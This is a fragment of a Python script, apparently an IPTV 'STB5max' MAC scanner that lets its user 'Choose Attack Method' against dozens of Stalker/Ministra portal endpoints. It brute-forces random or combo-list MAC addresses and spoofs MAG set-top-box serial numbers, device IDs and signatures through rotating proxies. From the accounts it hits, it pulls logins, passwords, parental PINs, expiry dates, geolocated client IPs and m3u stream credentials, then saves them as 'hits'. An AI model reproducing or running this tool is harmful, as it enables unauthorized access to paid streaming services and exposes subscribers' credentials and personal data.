║∘Mᴀᴄ➛ """+str(mac)+"""
║∘Exᴘ➛ """+str(trh)+"""
║☞ᴍзᴜꜱᴛᴀᴛᴜꜱ➛ """+m3uimage+"""
╠❪❪❪ 𝑺𝑪𝑨𝑵𝑵𝑰𝑵𝑮 🔅 𝑰𝑵𝑭𝑶 ❫❫❫▬ι══ﺤ
║🥷 Hɪᴛs ʙʏ ☞ """+str(nickn)+""" ☜
║🧛‍♀️‍ HɪᴛTɪᴍᴇ: """+str(time.strftime('%H:%M / %d.%m.%Y'))+"""
║⚔️ 𝐒𝐓𝐁 𝐕𝟓 𝐌𝐚𝐱 ✶ 𝐔𝐩𝐝𝐚𝐭𝐞:33
║🥇 #𝐏𝐫𝐞𝐦𝐢𝐮𝐦𝐏𝐲𝐅𝐫𝐞𝐞 ღ  ʙʏ ʀɪᴍɪ
║▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂

"""


    yak(cimza)
    hitsay=hitsay+1
    #print(cimza)
    if hitsay >= hit:
      hitr="\33[33m"
    
    
    dimza=""""""+str(mac)+""" 
"""
    yaz(dimza)
    hitsay=hitsay+1
    if hitsay >= hit:
      hitr="\33[33m"

def data_server(scountry):
    
    bandera=''
    pais=''
    origen=''
    try:        
        codpais=scountry
        bandera=flag.flag(codpais)
        origen=bandera
    except:pass
    return origen
os.system('clear')
print(anonym) 
nickn = input("""\033[1;32m        Welcome into STB5max ᴾᴿᴱᴹᴵᵁᴹ 
\33[36m       Expiration Date: 31-Dec-2050 
\033[90m               UPDATE: 34  
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬   \33[0m
\x1b[38;5;226m         *(Enter your nick name:)*    
 If nothing is written, then name "ANONYM"
 will be automatically written to HiTS.FiLE\33[0m
\33[36m\33[1m      Pres ENTER or writte your Nick:
      = \x1b[38;5;1m\33[1m """)
if nickn == '':
    nickn = 'Unknown'
os.system('clear')
print(anonym) 
panel=input("""\033[90m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬   \33[0m
          \033[1;32mTYPE IN A HOST TO SCAN \33[0m

\33[36m\33[1m\33[1m ◌Portal➥ \x1b[38;5;1m\33[1m""" )

hits=rootDir+'/Users/dumancan/Desktop/STBV5-MAX-PROXY-MAC'
if not os.path.exists(hits):
    os.mkdir(hits)
hitsay=0
say=1
def yax(hits):
    dosya=open(Dosyab,'a+', encoding='utf-8')
    dosya.write(hits)
    dosya.close()  
    
def device(mac):
  mac=mac.upper()
  SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
  SNENC=SN.upper() #SN
  SNCUT=SNENC[:13]#Sncut
  DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
  DEVENC=DEV.upper() #dev1
  DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
  DEVENC1=DEV1.upper()#dev2
  SG=SNCUT+'+'+(mac)
  SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
  SINGENC=SING.upper()
  sifre="""

╓❪❪❪ 𝑫𝑬𝑽𝑰𝑪𝑬 💢 𝑰𝑵𝑭𝑶 ❫❫❫
║∘sɴᴄᴜᴛ➛ """+SNCUT+"""
║∘sɴ➛ """+SNENC+"""   
║∘ɪᴅ¹➛  """+DEVENC+"""
║∘ɪᴅ²➛ " """+DEVENC1+"""
║∘sɪɢ➛ """+SINGENC+"""
╚⫸[ ꜰʀᴇᴇ ᴘʏ ᴄᴏɴғɪɢ ʙʏ ʀɪᴍɪ ] """

  return sifre
def list(listlink,mac,token,livel):
  kategori=""
  veri=""
  while True:
    try:
      res = ses.get(listlink,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3), verify=False)
      veri=str(res.text)
      break
    except:pass
  if veri.count('title":"')>0:
      for i in veri.split('title":"'):
        try:
          kanal=""
          kanal = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\\/','/')
        except:pass
        kategori=kategori+kanal+livel
        kategori=kategori.replace("{ ««◌»» "," ««◌»» ")
  list=kategori
  return list
def m3ugoruntu(cid,user,pas,plink):
  durum="ᴏꜰꜰʟɪɴᴇ "
  try:
      url=http+"://"+plink+'/live/'+str(user)+'/'+str(pas)+'/'+str(cid)+'.ts'
      res = ses.get(url,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
      if res.status_code==302 or res.status_code==406:
        durum="ᴏɴʟɪɴᴇ "
  except:
      durum="ᴏꜰꜰʟɪɴᴇ "
  return durum
hit=0           

def m3uapi(playerlink,mac,token):
  mt=""
  bag=0
  veri=""
  bad=0
  while True:
    try:
      res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
      veri=str(res.text)
      break
    except:
      if not proxi =="1":
        bad=bad+1
        if bad==3:
          break
  if veri=="" or '404' in veri:
    bad=0
    while True:
      try:
        playerlink=playerlink.replace('player_api.php','panel_api.php')
        res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
        veri=str(res.text)
        break
      except:
        if not proxi =="1":
          bad=bad+1
          if bad==3:
            break
  acon=""
  timezone=""
  message=""
  if 'active_cons' in veri:
        acon=veri.split('active_cons":')[1]
        acon=acon.split(',')[0]
        acon=acon.replace('"',"")
        mcon=veri.split('max_connections":')[1]
        mcon=mcon.split(',')[0]
        mcon=mcon.replace('"',"")
        status=veri.split('status":')[1]
        status=status.split(',')[0]
        status=status.replace('"',"")
        try:
          timezone=veri.split('timezone":"')[1]
          timezone=timezone.split('",')[0]
          timezone = timezone.replace("\\/","/")
          timezone=timezone.replace("_"," ")
        except:pass
        realm=veri.split('url":')[1]
        realm=realm.split(',')[0]
        realm=realm.replace('"',"")
        port=veri.split('port":')[1]
        port=port.split(',')[0]
        port=port.replace('"',"")
        userm=veri.split('username":')[1]
        userm=userm.split(',')[0]
        userm=userm.replace('"',"")
        pasm=veri.split('password":')[1]
        pasm=pasm.split(',')[0]
        pasm=pasm.replace('"',"")
        bitism=veri.split('exp_date":')[1]
        bitism=bitism.split(',')[0]
        bitism=bitism.replace('"',"")
        try:
          message=veri.split('message":"')[1].split(',')[0].replace('"','')
          message = str(message.encode('utf-8').decode("unicode-escape")).replace('\\/','/')
          if message=="":
            message="𝙸𝚙𝚝𝚟 𝚐𝚛𝚊𝚝𝚒𝚜 𝚙𝚊𝚛𝚊 𝚝𝚘𝚍𝚘𝚜!"
        except:pass
        if bitism=="null":
          bitism="ᴜɴʟɪᴍɪᴛᴇᴅ "
        else:
          bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
          mt=("""
          
╔❪❪❪ 𝑿𝑻𝑹𝑬𝑨𝑴 🦈 𝑰𝑵𝑭𝑶 ❫❫❫
║◌R➛http://"""+realm+""":"""+port+"""
║∘Usᴇʀ➛ """+userm+"""
║∘Pᴀss➛ """+pasm+"""
║∘Cᴏɴɴ➛ ᴍᴀx:"""+mcon+""" ⁃ ᴀᴄᴛ:"""+acon+"""
╠═✷Sᴛᴀᴛᴜꜱ➛ """+status+"""
║∘Tᴢᴏɴᴇ➛ """+timezone+"""
╠═⊛ Hɪᴛꜱ ʙʏ ☞ """+str(nickn)+""" ☜
║∘Mзᴜᴘʟʏᴇʀꜱ➛ 𝖤𝗑𝗍𝗋𝖾𝗆𝖾,𝖳𝗂𝗏𝗂𝖬𝖺𝗍𝖾
╚⫸[ 𝐒𝐓𝐁𝟓✶𝐏𝐫𝐨彡𝐅𝐫𝐞𝐞#𝐏𝐫𝐞𝐦𝐢𝐮𝐦 ] """)

  return mt           
def goruntu(link,cid):
  #print(link)
  say=0
  duru="ᴇxɪsᴛ"
  try:
    res = ses.get(link,  headers=hea3(), timeout=10, allow_redirects=False,stream=True)
    #print(res.status_code)
    if res.status_code==302 or res.status_code==406:
      duru="ᴇxɪsᴛ "
  except:
      duru="ᴜsᴇ ᴠᴘɴ"
  return duru   
    
def url7(cid):
  url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
  if uzmanm=="stalker_portal/server/load.php":
    url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/"+str(cid)+"&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
    url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http:///ch/"+str(cid)+"&&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
  return str(url)
  
def hea3():
  hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
  }
  
  return hea      
def hitecho(mac,trh):
  if rootDir == "/Users/dumancan/Desktop/STBV5-MAX-PROXY-MAC":
    playsound(rootDir+'sounds/STBMAX5.mp3')
    file = pathlib.Path()
    try:
      if file.exists():
        ad.mediaPlay()
    except:pass
  
  if rootDir == "/Users/dumancan/Desktop/STBV5-MAX-PROXY-MAC":
    sesdosya=rootDir+"sounds/STBMAX5.mp3"
    file = pathlib.Path(sesdosya)
    try:
      if file.exists():
         ad.mediaPlay(sesdosya)
    except:pass
  #print("""\33[1;90m𝐒𝐓𝐁√ˣ𝐏𝐑𝐎 \33[0m\33[1;92m▄︻デMᴀx["""+str(macon)+"""]Hɪᴛs==ᕗ 🦅 \33[0m\33[1;4;90mPʀᴇᴍɪᴜᴍ\33[0m""")   
def unicode(fyz):
  cod = fyz.encode('utf-8').decode("unicode-escape").replace('\\/', '/')
  return cod

def duzel2(veri,vr):
  data=""
  try:
    data=veri.split('"'+str(vr)+'":"')[1]
    data=data.split('"')[0]
    data=data.replace('"','')
    data=unicode(data)
  except:pass
  return str(data)
        
def duzelt1(veri,vr):
  data=veri.split(str(vr)+'":"')[1]
  data=data.split('"')[0]
  data=data.replace('"','')
  return str(data)
                          
import datetime
import time
import hashlib
import urllib
def url2(mac,random):
  macs=mac.upper()
  macs=urllib.parse.quote(macs)
  SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
  SNENC=SN.upper() #SN
  SNCUT=SNENC[:13]#Sncut
  DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
  DEVENC=DEV.upper() #dev1
  DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
  DEVENC1=DEV1.upper()#dev2
  SG=SNCUT+(mac)
  SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
  SINGENC=SING.upper() #signature
  url22=http+"://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml"
  if uzmanm=="stalker_portal/server/load.php":
      times=time.time()
      url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22'+macs+'%22%2C%22sn%22%3A%22'+SNCUT+'%22%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22%2C%22random%22%3A%22'+random+'%22%7D&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350&timestamp='+str(times)+'&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml'
      if stalker_portal=="2":
        url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: 5.5.0; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG254&image_version=218&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature='+SINGENC+'&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=7c431b0aec69b2f0194c0680c32fe4e3&timestamp='+str(times)+'&api_signature=263&metrics={\\\"mac\\\":\\\"'+macs+'\\\",\\\"sn\\\":\\\"'+SNCUT+'\\\",\\\"model\\\":\\\"MAG254\\\",\\\"type\\\":\\\"STB\\\",\\\"uid\\\":\\\"'+DEVENC+'\\\",\\\"random\\\":\\\"'+random+'\\\"}&JsHttpRequest=1-xml'
      if stalker_portal=="1":
        url22=http+"://"+panel+"/"+uzmanm+'?action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566'
                
  if realblue=="real" or uzmanm=="c/portal.php":
    url22=http+"://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
  return url22
def XD():
  global m3uvpn,m3uon,macon,macvpn,bot,hit,tokenr,hitr
  bot=bot+1
  for anonym in range(combouz):
    if comboc=="anonym":
      mac=randommac()
      mac=mac.upper()
    else:
      macv=re.search(pattern,combogetir(),re.IGNORECASE)
      if macv:
        mac=macv.group()
        mac=mac.upper()
      else:
        continue
    url=http+"://"+panel+"/"+uzmanm+"?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml"
    ses=requests.Session()
    prox=proxygetir()
    oran=round(((combosay)/(combouz)*100),2)
    #print(url)
    while True:
      try:
        res=ses.get(url,headers=hea1(panel,mac),proxies=prox,timeout=(3))
        break
      except:
        prox=proxygetir()
    echok(mac,bot,combosay,hit,res.status_code,oran)
    veri=str(res.text)
    #print(veri)
    random=""
    if not 'token":"' in veri:
      tokenr=" \33[95m"
      ses.close
      res.close
      continue
    tokenr="\33[0m"
    token=duzelt1(veri,"token")
    if 'random' in veri:
      random=duzelt1(veri,"random")
    veri=""
    while True:
      try:
        res=ses.get(url2(mac,random),headers=hea2(mac,token),proxies=prox,timeout=(3))
        break
      except:
        prox=proxygetir()
    veri=str(res.text)
    adult=veri.split('parent_password":"')[-1]
    adult=adult.split('","bright')[0]
    #print(veri)
    id="null"
    ip=""
    login=""
    parent_password=""
    password=""
    stb_type=""
    tariff_plan_id=""
    comment=""
    country=""
    settings_password=""
    expire_billing_date=""
    max_online=""
    expires=""
    ls=""
    try:
      id=veri.split('{"js":{"id":')[1]
      id=str(id.split(',"name')[0])
    except:pass
    
    try:
        ip=str(duzel2(veri,"ip"))
    except:pass
    try:
      expires=str(duzel2(veri,"expires"))
    except:pass
    if id=="null" and expires=="" and ban=="":
      continue
      ses.close
      res.close
    if uzmanm=="stalker_portal/server/load.php":
      if 'login":"' in veri:
        login=str(duzel2(veri,"login"))
        parent_password=str(duzel2(veri,"parent_password"))
        password=str(duzel2(veri,"password"))
        stb_type=str(duzel2(veri,"stb_type"))
        tariff_plan_id=str(duzel2(veri,"tariff_plan_id"))
        comment=str(duzel2(veri,"comment"))
        if comment=="":
          comment="𝙸𝚙𝚝𝚟 𝚐𝚛𝚊𝚝𝚒𝚜 𝚙𝚊𝚛𝚊 𝚝𝚘𝚍𝚘𝚜!"
        country=str(duzel2(veri,"country"))
        settings_password=str(duzel2(veri,"settings_password"))
        expire_billing_date=str(duzel2(veri,"expire_billing_date"))
        ls=str(duzel2(veri,"ls"))
        try:
          max_online=str(duzel2(veri,"max_online"))
        except:pass
    #print(veri)
    url=http+"://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
    
    veri=""
    while True:
      try:
        res=ses.get(url,headers=hea2(mac,token),proxies=prox,timeout=(3))
        break
      except:
        prox=proxygetir()
    veri=str(res.text)
    #print(veri)
  # quit()
    if veri.count('phone')==0 and veri.count('end_date')==0 and expires=="" and expire_billing_date=="":
      continue
      ses.close
      res.close
    fname=""
    tariff_plan=""
    ls=""
    trh=""
    bill=""
    KalanGun=""   
    if uzmanm=="stalker_portal/server/load.php":
      try:
        fname=str(duzel2(veri,"fname"))
      except:pass
      try:
          tariff_plan=str(duzel2(veri,"tariff_plan"))
      except:pass
      try:
          bill=str(duzel2(veri,"created"))
      except:pass
    if "phone" in veri:
      trh=str(duzel2(veri,"phone"))
    if "end_date" in veri:
      trh=str(duzel2(veri,"end_date"))
    if trh=="":
      if not expires=="":
        trh=expires
    try:
      trh=(datetime.datetime.fromtimestamp(int(trh)).strftime('%d-%m-%Y %H:%M:%S'))
    except:pass
    if '(-' in trh:
      continue
      ses.close
      res.close
    
    if trh.lower()[:2] =='un':
      KalanGun=(" Days")
    else:
      try:
                      KalanGun=(str(tarih_clear(trh))+" Days")
                      if tarih_clear(trh) < 0:
                            macexp=macexp+1
                            continue
                            ses.close
                            res.close
                      trh=trh+' '+ KalanGun
      except:pass
    if trh=="":
      if uzmanm=="stalker_portal/server/load.php":
        trh=expire_billing_date
    veri=""
    cid="1842"
    url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
    bad=0
    while True:
      try:
        res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
        veri=str(res.text)
        if 'total' in veri:
          cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
        if uzmanm=="stalker_portal/server/load.php":
             cid=(str(res.text).split('id":"')[5].split('"')[0])
        break
      except:pass
    user=""
    pas=""
    link=""
    
    real=panel
    if not expires=="":
      veri=""
      cmd=""
      url=http+"://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml"
      while True:
        try:
          res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
          veri=str(res.text)
          break
        except:pass
      if not 'cmd' in veri:
        continue
      cmd=duzel2(veri,'cmd')
      
      veri=""
      url=http+"://"+panel+"/"+uzmanm+"?type=vod&action=create_link&cmd="+str(cmd)+"&series=&forced_storage=&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
      while True:
        try:
          res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
          veri=str(res.text)
          break
        except:pass
      if 'cmd":"' in veri:
        link = veri.split('cmd":"')[1].split('"')[0].replace('\\/', '/')
        user=str(link.replace('movie/','').split('/')[3])
        real=http+"://"+link.split('://')[1].split('/')[0]+'/c/'
        pas=str(link.replace('movie/','').split('/')[4])
        cid=duzel2(veri,'id')
        m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
        
    hitecho(mac,trh)
    hit=hit+1
    hitr="\33[33m"
    if '-' in KalanGun:
      hitr="\33[1;92m"
      hit=hit-1
      continue
      ses.close
      res.close
    veri=""   
    veri=""
    if user=="":
      while True:
        try:
          res = ses.get(url7(cid), headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
          veri=str(res.text)
          if 'ffmpeg ' in veri:
               link = veri.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
          else:
               if 'cmd":"' in veri:
                link = veri.split('cmd":"')[1].split('"')[0].replace('\\/', '/')
                user=login
                pas=password
                real='http://'+link.split('://')[1].split('/')[0]+'/c/'
          if 'ffmpeg ' in veri:
               user=str(link.replace('live/','').split('/')[3])
               pas=str(link.replace('live/','').split('/')[4])
               if real==panel:
                real='http://'+link.split('://')[1].split('/')[0]+'/c/'
          m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
        
          break
        except:pass
    durum=""
    if not link=="":
      try:
        durum=goruntu(link,cid)
      except:pass
    if not m3ulink=="":
      playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
      plink=real.replace('http://','').replace('/c/','')
      playerapi=m3uapi(playerlink,mac,token)
      m3uimage=m3ugoruntu(cid,user,pas,plink)
      if playerapi=="":
          playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
          plink=panel.replace('http://','').replace('/c/','')
          playerapi=m3uapi(playerlink,mac,token)
          m3uimage=m3ugoruntu(cid,user,pas,plink)
    if m3uimage=="ᴏɴʟɪɴᴇ ":
      m3uvpn=m3uvpn+1
    else:
      m3uon=m3uon+1
    if durum=="ᴜsᴇ ᴠᴘɴ" or durum=="ɪɴᴠᴀʟɪᴅ ᴏᴘᴘꜱ":
      macvpn=macvpn+1
    else:
      macon=macon+1
    vpn=""
    if not ip =="":
      vpn=vpnip(ip)
    else:
      vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"

    url5="https://ipapi.co/"+ip+"/json/" 
    while True:
         try:
             res = ses.get(url5, timeout=5, verify=False)
             break
         except:
             bag1=bag1+1
             time.sleep(5)
             if bag1==4:
                  break
                  
    try:
           bag1=0
           veri=str(res.text)
           scountry=""
           country_name="Unavailable 🏴‍☠️"
           scountry=veri.split('country_code": "')[1]
           scountry=scountry.split('"')[0]
           country_name=veri.split('country_name": "')[1]
           country_name=country_name.split('"')[0]
           if country_name=="":
            country_name="Unavailable 🏴‍☠️"
           
    except:pass

    urlkasay=""
    urlfsay=""
    urldsay=""
    livelist=""
    vodlist=""
    serieslist=""
    
    try:
      urlksay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
      res = ses.get(urlksay,timeout=15, verify=False)
      veri=str(res.text)
      kanalsayisi=str(veri.count("stream_id"))
      
      urlfsay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
      res = ses.get(urlfsay, timeout=15, verify=False)
      veri=str(res.text)
      filmsayisi=str(veri.count("stream_id"))
      
      urldsay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
      res = ses.get(urldsay,  timeout=15, verify=False)
      veri=str(res.text)
      dizisayisi=str(veri.count("series_id"))

    except:pass   
    
    liveurl=http+"://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
    if not expires=="":
      liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml" 
    if uzmanm=="stalker_portal/server/load.php":
      liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
    vodurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
    seriesurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
    if kanalkata=="1" or kanalkata=="2":
      listlink=liveurl
      livel=' ««◌»» '
      livelist=list(listlink,mac,token,livel)
    if kanalkata=="2":
      listlink=vodurl
      livel=' ««◌»» '
      vodlist=list(listlink,mac,token,livel)
      listlink=seriesurl
      livel=' ««◌»» '
      serieslist=list(listlink,mac,token,livel)
    
    hityaz(mac,trh,real,m3ulink,m3uimage,durum,vpn,kanalsayisi,filmsayisi,dizisayisi,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,adult,scountry,country_name)
  
def vpnip(ip):
  url9="https://freegeoip.app/json/"+ip
  vpnip=""
  vpn="ɴᴏᴛ ɪɴᴠᴀʟɪᴅ"
  veri=""
  try:
    res = ses.get(url9,  timeout=7, verify=False)
    veri=str(res.text)
  except:
    vpn="ɴᴏᴛ ɪɴᴠᴀʟɪᴅ"
  if not '404 page' in veri:
    if 'country_name' in veri:
      vpnc=veri.split('"city":"')[1]
      vpnc=vpnc.split('"')[0]
      vpnips=veri.split('"country_name":"')[1]
      vpn=vpnips.split('"')[0]
      vpn= vpn +' / ' +vpnc
  else:
      vpn="ɴᴏᴛ ɪɴᴠᴀʟɪᴅ"
  return vpn
import socket

os.system('clear')
print(anonym)
import os
os.system('clear')
ban=""
speed=""
buri=""
urib=""
uzmanc=""
uzmanm2=""
uzmanm="portal.php"
useragent="okhttp/4.7.1"
realblue=""
print("\n\n\n\n\n\n\33[1m Choose Attack Method ! \33[0m\n")
reqs=(
"portal.php",
"server/load.php",
"c/portal.php",
"stalker_portal/server/load.php",
"stalker_portal/server/load.php - old",
"stalker_portal/server/load.php - «▣»",
"portal.php - Real Blue",
"portal.php - httpS",
"stalker_portal/server/load.php-httpS",
"portal.php (White Ultra)",
"client/portal.php",
"portalstb/portal.php",
"portalmega.php",
"magportal/portal.php",
"magaccess/portal.php",
"maglove/portal.php",
"powerfull/portal.php",
"bStream/port.php",
"blowportal/portal.php",
"ministra/portal.php",
"rmxportal/portal.php",
"cmdforex/portal.php",
"cp/server/load.php",
"tek/server/load.php",
"ghandi_portal/server/load.php",
"delko/portal.php",
"p/portal.php",
"k/portal.php (comet)",
"Link_Ok.php",
"bs.mag.portal",
"magLoad.php",
"portalcc.php",
"portalmega.php",
)
say=0
for i in reqs:
  say=say+1
  print( str(say)+" \033[1;32m\33[1m=⫸ \33[0m \x1b[38;5;226m"+str(i)+"\33[0m")
say=0
uzmanm=input('\n    \x1b[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\x1b[38;5;231m  ')
if uzmanm=="0":
  uzmanm=input(" Write request =⫸ \33[0m")
if uzmanm=="":
  uzmanm="portal.php"

if uzmanm=="portal.php":
    uzmanm="portal.php"
    uzmanc="portal"
    urib=""
if uzmanm=="server/load.php":
    uzmanm="server/load.php"
    uzmanc="load"
if uzmanm=="c/portal.php":
    uzmanm="c/portal.php"
    uzmanc="c/portal"
uzmanm=reqs[int(uzmanm)-1]
if uzmanm=="stalker_portal/server/load.php - old":
  stalker_portal="2"
  uzmanm="stalker_portal/server/load.php"
if uzmanm=="stalker_portal/server/load.php - «▣»":
  stalker_portal="1"
  uzmanm="stalker_portal/server/load.php"
if uzmanm=="portal.php - No Ban":
  ban="ban"
  uzmanm="portal.php"
http="http"
if uzmanm=="portal.php - Real Blue":
  realblue="real"
  uzmanm="portal.php"
if uzmanm=="portal.php - httpS":
  uzmanm="portal.php"
  http="https"
if uzmanm=="stalker_portal/server/load.php-httpS":
  uzmanm="stalker_portal/server/load.php"
  http="https"
if uzmanm=="portal.php":
    uzmanm="portal.php"
    uzmanc="ultra"
if uzmanm=="client/portal.php":
    uzmanm="client/portal.php"
    uzmanc="client"
if uzmanm=="portalstb/portal.php":
    uzmanm="portalstb/portal.php"
    uzmanc="portalstb"
if uzmanm=="magportal/portal.php":
    uzmanm="magportal/portal.php"
    uzmanc="magportal"
if uzmanm=="magaccess/portal.php":
    uzmanm="magaccess/portal.php"
    uzmanc="magaccess"
if uzmanm=="maglove/portal.php":
    uzmanm="maglove/portal.php"
    uzmanc="maglove"
if uzmanm=="powerfull/portal.php":
    uzmanm="powerfull/portal.php"
    uzmanc="powerfull"
if uzmanm=="bStream/portal.php":
    uzmanm="bStream/portal.php"
    uzmanc="bStream"
if uzmanm=="blowportal/portal.php":
    uzmanm="blowportal/portal.php"
    uzmanc="blowportal"
if uzmanm=="ministra/portal.php":
    uzmanm="ministra/portal.php"
    uzmanc="ministra"
if uzmanm=="rmxportal/portal.php":
    uzmanm="rmxportal/portal.php"
    uzmanc="rmxportal"
if uzmanm=="cmdforex/portal.php":
    uzmanm="cmdforex/portal.php"
    uzmanc="cmdforex"
if uzmanm=="cp/server/load.php":
    uzmanm="cp/server/load.php"
    uzmanc="cp/c/"
if uzmanm=="tek/server/load.php":
    uzmanm="tek/server/load.php"
    uzmanc="tek"
if uzmanm=="ghandi_portal/server/load.php":
    uzmanm="ghandi_portal/server/load.php"
    uzmanc="ghandi_portal"
if uzmanm=="delko/portal.php":
    uzmanm="delko/portal.php"
    uzmanc="delko"
